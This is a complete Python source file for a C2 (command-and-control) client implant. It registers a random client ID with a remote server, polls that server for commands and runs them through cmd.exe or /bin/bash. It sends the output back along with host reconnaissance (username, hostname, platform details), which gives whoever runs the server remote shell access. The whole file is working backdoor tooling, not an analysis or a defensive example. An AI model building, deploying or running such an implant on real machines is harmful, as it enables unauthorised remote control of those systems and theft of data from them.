import aiohttp
import asyncio
import platform
import subprocess
import uuid
import logging
import os
import sys
import socket

# Fix for Windows event loop
if platform.system() == "Windows":
    # Use the selector event loop policy on Windows
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('c2_client')

class C2Client:
    def __init__(self, server_url, poll_interval=10):
        """
        Initialize the C2 client.
        
        Args:
            server_url (str): URL of the C2 server
            poll_interval (int): Time in seconds between polling for commands
        """
        self.server_url = server_url
        self.poll_interval = poll_interval
        self.client_id = str(uuid.uuid4())
        self.running = False
        logger.info(f"Initializing client with ID: {self.client_id}")
    
    async def register(self):
        """Register the client with the C2 server"""
        try:
            async with aiohttp.ClientSession() as session:
                payload = {"client_id": self.client_id}
                async with session.post(f"{self.server_url}/api/register", json=payload) as response:
                    if response.status == 200:
                        response_data = await response.json()
                        logger.info(f"Registered with server: {response_data}")
                        return True
                    else:
                        logger.error(f"Failed to register: {response.status}")
                        return False
        except Exception as e:
            logger.error(f"Registration error: {str(e)}")
            return False
    
    async def poll_commands(self):
        """Poll the server for new commands"""
        try:
            async with aiohttp.ClientSession() as session:
                payload = {"client_id": self.client_id}
                async with session.post(f"{self.server_url}/api/commands/get", json=payload) as response:
                    if response.status == 200:
                        response_data = await response.json()
                        commands = response_data.get("commands", [])
                        logger.info(f"Received {len(commands)} commands")
                        return commands
                    else:
                        logger.error(f"Failed to get commands: {response.status}")
                        return []
        except Exception as e:
            logger.error(f"Command polling error: {str(e)}")
            return []
    
    async def submit_result(self, cmd_id, result):
        """Submit the result of a command execution back to the server"""
        try:
            async with aiohttp.ClientSession() as session:
                payload = {"cmd_id": cmd_id, "result": result}
                async with session.post(f"{self.server_url}/api/commands/submit", json=payload) as response:
                    if response.status == 200:
                        logger.info(f"Result for command {cmd_id} submitted successfully")
                        return True
                    else:
                        logger.error(f"Failed to submit result: {response.status}")
                        return False
        except Exception as e:
            logger.error(f"Result submission error: {str(e)}")
            return False
    
    def execute_command(self, command):
        """Execute a system command and return the result"""
        try:
            # Handle special commands
            if command.lower() == "whoami":
                return os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER') or os.getenv('USERNAME') or 'Unknown'
            
            elif command.lower() == "hostname":
                return socket.gethostname()
            
            elif command.lower() == "sysinfo":
                return {
                    "hostname": socket.gethostname(),
                    "platform": platform.platform(),
                    "system": platform.system(),
                    "release": platform.release(),
                    "version": platform.version(),
                    "architecture": platform.machine(),
                    "processor": platform.processor(),
                    "python_version": sys.version
                }
            
            # Execute general shell commands
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    ["cmd.exe", "/c", command],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True
                )
            else:  # Unix/Linux/MacOS
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    executable="/bin/bash"
                )
            
            stdout, stderr = process.communicate()
            
            result = {
                "stdout": stdout.decode('utf-8', errors='replace'),
                "stderr": stderr.decode('utf-8', errors='replace'),
                "exit_code": process.returncode
            }
            return result
            
        except Exception as e:
            return {"error": str(e)}
    
    async def process_commands(self, commands):
        """Process received commands"""
        for cmd in commands:
            cmd_id = cmd.get("id")
            command = cmd.get("command")
            
            logger.info(f"Executing command: {command}")
            
            # Execute the command
            result = self.execute_command(command)
            
            # Submit the result back to the server
            await self.submit_result(cmd_id, result)
    
    async def run(self):
        """Main client loop"""
        self.running = True
        
        # Register with the server
        registered = await self.register()
        if not registered:
            logger.error("Failed to register with server. Exiting.")
            return
        
        logger.info(f"C2 client started with ID: {self.client_id}")
        logger.info(f"Polling server every {self.poll_interval} seconds")
        
        while self.running:
            try:
                # Poll for commands
                commands = await self.poll_commands()
                
                # Process commands
                if commands:
                    await self.process_commands(commands)
                
                # Wait for the next polling interval
                await asyncio.sleep(self.poll_interval)
                
            except Exception as e:
                logger.error(f"Error in client loop: {str(e)}")
                await asyncio.sleep(self.poll_interval)
    
    def stop(self):
        """Stop the client"""
        self.running = False
        logger.info("Client stopping...")

async def main():
    # Parse command line arguments
    import argparse
    parser = argparse.ArgumentParser(description='C2 Client')
    parser.add_argument('--server', type=str, default='http://localhost:8080', help='C2 server URL')
    parser.add_argument('--interval', type=int, default=10, help='Polling interval in seconds')
    args = parser.parse_args()
    
    # Create and run the client
    client = C2Client(args.server, args.interval)
    try:
        await client.run()
    except KeyboardInterrupt:
        client.stop()

if __name__ == "__main__":
    asyncio.run(main())